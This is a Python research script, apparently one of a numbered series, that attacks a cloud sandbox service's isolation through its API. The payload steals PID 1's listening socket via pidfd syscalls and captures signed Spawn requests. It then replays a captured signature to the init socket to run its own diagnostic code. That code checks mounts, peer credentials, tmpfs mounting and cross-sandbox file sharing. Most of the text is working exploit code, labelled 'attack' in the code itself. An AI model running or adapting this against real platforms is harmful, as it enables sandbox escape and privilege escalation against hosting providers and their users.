# 实验J139: 全caps利用面探测 — mount能力 + /run/vercel/share共享性 + agent连接身份(SO_PEERCRED) + mountns对比
# 前提: j138 确认 Spawn 进程 CapEff=全1(41bit), /run/vercel/share 属主可写
# 目标: ①mount tmpfs 是否被 seccomp 拦截 ②共享目录跨沙箱可见性 ③agent 连接的 uid/pid 身份 ④sandbox-init mount ns
# 零破坏: 仅创建唯一 marker 文件与临时挂载(实验后随沙箱销毁)
import json, time, urllib.request, urllib.error, sys, threading
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def make_sandbox(name):
    api("DELETE", f"/v2/sandboxes/{name}?teamId={TEAM}&projectId={PROJ}")
    c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
               {"projectId": PROJ, "name": name,
                "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
    if c != 200:
        print(f"create {name}: {c} {r[:200]}", flush=True)
        return None
    return json.loads(r)["sandbox"]["currentSessionId"]

# ============ 沙箱 A: 捕获+攻击诊断 ============
NAME_A = "expj139a"
sidA = make_sandbox(NAME_A)
print("sidA:", sidA)

PROBE = r"""
import os, socket, ctypes, time, threading, json, base64, subprocess, struct, sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockopt.restype = ctypes.c_int

def sc(nr, *args):
    ctypes.set_errno(0)
    r = libc.syscall(nr, *args)
    return r, ctypes.get_errno()

pub = None
for a in open("/proc/1/cmdline", "rb").read().split(b"\x00"):
    if a.startswith(b"--pubkey="):
        pub = a[len(b"--pubkey="):]
if pub:
    raw = base64.b64decode(pub)
    der = bytes.fromhex("302a300506032b6570032100") + raw
    pem = (b"-----BEGIN PUBLIC KEY-----\n" + base64.b64encode(der) +
           b"\n-----END PUBLIC KEY-----\n")
    open("/root/pub.pem", "wb").write(pem)
print("PUBKEY_OK" if pub else "PUBKEY_NONE", flush=True)

pfd, e = sc(434, 1, 0)
listener_nfd = None
if pfd >= 0:
    fdmap = {}
    for fd in sorted(os.listdir("/proc/1/fd"), key=int):
        try:
            fdmap[int(fd)] = os.readlink("/proc/1/fd/" + fd)
        except Exception:
            pass
    print("FDMAP:", json.dumps(fdmap), flush=True)
    for fd, ln in fdmap.items():
        if "socket:" not in ln:
            continue
        nfd, e2 = sc(438, pfd, fd, 0)
        if nfd < 0:
            continue
        v = ctypes.c_int(0)
        l = ctypes.c_int(4)
        r = libc.getsockopt(nfd, 1, 30, ctypes.byref(v), ctypes.byref(l))
        if r == 0 and v.value == 1:
            listener_nfd = nfd
            print("LISTENER fd=%d nfd=%d" % (fd, nfd), flush=True)
            break

captured = []
stop = threading.Event()
accept_pause = threading.Event()

def verify(msg, sig):
    open("/root/m.bin", "wb").write(msg)
    open("/root/s.bin", "wb").write(sig)
    r = subprocess.run(["openssl", "pkeyutl", "-verify", "-pubin", "-inkey",
                        "/root/pub.pem", "-rawin", "-in", "/root/m.bin",
                        "-sigfile", "/root/s.bin"], capture_output=True, timeout=15)
    return r.returncode == 0

def put_varint(out, val):
    while True:
        x = val & 0x7f
        val >>= 7
        if val:
            out.append(x | 0x80)
        else:
            out.append(x)
            return

def sfield(f, v):
    b = v.encode() if isinstance(v, str) else v
    out = bytearray()
    put_varint(out, (f << 3) | 2)
    put_varint(out, len(b))
    return bytes(out) + b

def do_attack(proto):
    env = b"\x00" + struct.pack(">I", len(proto)) + proto
    payload = (b"POST " + ctx["path"].encode() + b" HTTP/1.1\r\n"
               b"Host: localhost\r\n"
               b"Content-Type: application/connect+proto\r\n"
               b"Connect-Protocol-Version: 1\r\n"
               b"X-Signature: " + ctx["sig"].encode() + b"\r\n"
               b"X-Timestamp: " + ctx["ts"].encode() + b"\r\n"
               b"Content-Length: " + str(len(env)).encode() + b"\r\n\r\n" + env)
    s = None
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(12)
        s.connect("/run/vercel/share/init.sock")
        s.sendall(payload)
        resp = b""
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                resp += c
        except socket.timeout:
            pass
        s.close()
        print("ATTACK resp_len=%d" % len(resp), flush=True)
        return resp
    except Exception as ex:
        print("ATTACK EXC %r" % (ex,), flush=True)
        if s is not None:
            try:
                s.close()
            except Exception:
                pass
        return b""

ctx = {}

if listener_nfd is None:
    print("NO_LISTENER", flush=True)
else:
    srv = socket.fromfd(listener_nfd, socket.AF_UNIX, socket.SOCK_STREAM)
    srv.settimeout(0.8)

    def accept_loop():
        while not stop.is_set():
            if accept_pause.is_set():
                time.sleep(0.2)
                continue
            try:
                conn, _ = srv.accept()
                conn.settimeout(4)
                data = b""
                while True:
                    try:
                        c = conn.recv(65536)
                    except socket.timeout:
                        break
                    if not c:
                        break
                    data += c
                    if len(data) > 262144:
                        break
                if data:
                    captured.append((time.time(), data))
                    print("CAP len=%d" % len(data), flush=True)
                conn.close()
            except socket.timeout:
                continue
            except OSError as ex:
                print("ACCEPT_ERR: %r" % (ex,), flush=True)
                time.sleep(0.3)

    threading.Thread(target=accept_loop, daemon=True).start()

    # 诊断代码 (python3 -c): 写 /tmp/d139.txt
    DIAG = r'''
import ctypes, os, struct
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockopt.restype = ctypes.c_int
out = open("/tmp/d139.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()

p("=== MOUNTINFO_1_CNT", len(open("/proc/1/mountinfo").readlines()))
p("=== MOUNTINFO_SELF_CNT", len(open("/proc/self/mountinfo").readlines()))
m1 = open("/proc/1/mountinfo").read()
ms = open("/proc/self/mountinfo").read()
p("=== M1==SELF:", m1 == ms)
p("=== M1_HEAD ===")
p(m1[:1200])

p("=== FDS ===")
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        p(fd, os.readlink("/proc/1/fd/" + fd))
    except Exception as ex:
        p(fd, "ERR", repr(ex))

def sc(nr, *a):
    return libc.syscall(nr, *a)

pfd = sc(434, 1, 0)
p("PIDFD", pfd)
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        ln = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        continue
    if "socket:" not in ln:
        continue
    nfd = sc(438, pfd, fd, 0)
    if nfd < 0:
        p("fd", fd, "dup_fail")
        continue
    buf = ctypes.create_string_buffer(128)
    l = ctypes.c_int(128)
    libc.getsockname.restype = ctypes.c_int
    r = libc.getsockname(nfd, ctypes.cast(buf, ctypes.c_void_p), ctypes.byref(l))
    fam = struct.unpack_from("H", buf.raw, 0)[0]
    info = "fam=%d addr=%s" % (fam, buf.raw[:l.value].hex())
    cb = ctypes.create_string_buffer(12)
    cl = ctypes.c_int(12)
    r2 = libc.getsockopt(nfd, 1, 17, cb, ctypes.byref(cl))
    if r2 == 0:
        pid, uid, gid = struct.unpack("iii", cb.raw[:12])
        info += " peer(pid=%d uid=%d gid=%d)" % (pid, uid, gid)
    p("fd", fd, info)
    libc.close(nfd)

p("=== MOUNT_TEST ===")
os.makedirs("/tmp/mnttest", exist_ok=True)
libc.mount.restype = ctypes.c_int
r = libc.mount(b"tmpfs", b"/tmp/mnttest", b"tmpfs", 0, b"")
p("mount rc", r, "errno", ctypes.get_errno(), os.strerror(ctypes.get_errno()))
if r == 0:
    open("/tmp/mnttest/probe.txt", "w").write("MNT-OK")
    p("mnt_file", open("/tmp/mnttest/probe.txt").read())

p("=== MARKER ===")
try:
    open("/run/vercel/share/expj139_marker.txt", "w").write("EXPJ139-" + str(os.getpid()))
    p("marker written")
except Exception as ex:
    p("marker err", repr(ex))
p("=== DONE")
out.close()
'''
    print("READY", flush=True)
    deadline = time.time() + 45
    attacked = False
    while time.time() < deadline:
        if not attacked:
            while captured:
                t, req = captured.pop(0)
                try:
                    head, _, body = req.partition(b"\r\n\r\n")
                    lines = head.decode("latin1").split("\r\n")
                    parts = lines[0].split(" ")
                    if len(parts) < 2:
                        continue
                    path = parts[1]
                    if not path.endswith("/Spawn"):
                        continue
                    hs = {}
                    for l in lines[1:]:
                        if ":" in l:
                            k, v = l.split(":", 1)
                            hs[k.strip().lower()] = v.strip()
                    sigb = hs.get("x-signature")
                    ts = hs.get("x-timestamp")
                    if not sigb or not ts:
                        continue
                    sig = base64.b64decode(sigb)
                    if verify(path.encode() + ts.encode(), sig):
                        print("VERIFY_OK ts=%s" % ts, flush=True)
                        ctx["path"] = path
                        ctx["ts"] = ts
                        ctx["sig"] = sigb
                        accept_pause.set()
                        time.sleep(0.5)
                        proto = (sfield(1, "python3") + sfield(2, "-c") + sfield(2, DIAG) +
                                 sfield(4, "/vercel/sandbox"))
                        do_attack(proto)
                        attacked = True
                        print("ATTACK_DONE", flush=True)
                    else:
                        print("VERIFY_FAIL", flush=True)
                except Exception as ex:
                    print("PROC_ERR: %r" % (ex,), flush=True)
        time.sleep(0.2)

    stop.set()
    print("DONE", flush=True)
"""

print(">> 沙箱A 捕获+攻击(45s)", flush=True)
t0 = time.time()

def trigger():
    time.sleep(5)
    for i in range(35):
        try:
            body = {"command": "echo", "args": ["t%d" % i], "wait": True, "logs": True, "timeout": 100}
            c, r = api("POST", f"/v2/sandboxes/sessions/{sidA}/cmd?teamId={TEAM}", body)
            print(f"  trigger[{i}] -> {c}", flush=True)
        except Exception as ex:
            print(f"  trigger[{i}] EXC {ex}", flush=True)
        time.sleep(1.0)

th = threading.Thread(target=trigger, daemon=True)
th.start()
run_cmd(sidA, PROBE, "exploit-diag", wait=True, timeout=300000)
th.join(timeout=1)

c2, r2 = api("POST", f"/v2/sandboxes/sessions/{sidA}/cmd?teamId={TEAM}",
             {"command": "cat", "args": ["/tmp/d139.txt"], "wait": True, "logs": True, "timeout": 100})
print(f"=== d139 status {c2} ===", flush=True)
print(r2[:7000], flush=True)

# ============ 沙箱 B: 跨沙箱共享验证 ============
NAME_B = "expj139b"
sidB = make_sandbox(NAME_B)
print("sidB:", sidB)
if sidB:
    c3, r3 = api("POST", f"/v2/sandboxes/sessions/{sidB}/cmd?teamId={TEAM}",
                 {"command": "ls", "args": ["-la", "/run/vercel/share/expj139_marker.txt"],
                  "wait": True, "logs": True, "timeout": 100})
    print(f"=== sandboxB marker check status {c3} ===", flush=True)
    print(r3[:800], flush=True)
    c4, r4 = api("POST", f"/v2/sandboxes/sessions/{sidB}/cmd?teamId={TEAM}",
                 {"command": "cat", "args": ["/run/vercel/share/expj139_marker.txt"],
                  "wait": True, "logs": True, "timeout": 100})
    print(f"=== sandboxB marker cat status {c4} ===", flush=True)
    print(r4[:400], flush=True)

api("DELETE", f"/v2/sandboxes/{NAME_A}?teamId={TEAM}&projectId={PROJ}")
if sidB:
    api("DELETE", f"/v2/sandboxes/{NAME_B}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done, elapsed=%.0fs" % (time.time() - t0), flush=True)
